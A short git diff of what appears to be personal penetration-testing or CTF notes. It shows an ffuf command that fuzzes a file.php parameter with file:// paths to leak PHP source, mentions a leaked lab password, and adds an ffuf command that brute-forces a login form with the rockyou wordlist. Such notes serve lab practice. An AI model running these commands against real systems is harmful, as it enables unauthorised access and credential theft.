@@ -117,3 +117,8 @@ ffuf -u "http://$TARGET/file.php?cv=file:///var/www/html/FUZZ.php" \
 Used on: **Recruit** — `config.php` leaked `$HR_PASSWORD = 'hrpassword123'`. Pair with [php-source-disclosure-lfi.md](../../exploits/web-disclosure/php-source-disclosure-lfi.md).
 
 
+
+### login bruteforce
+```bash
+ffuf -w usernames.txt:W1,/usr/share/wordlists/rockyou.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.130.177.138/customers/login -fc 200
+```
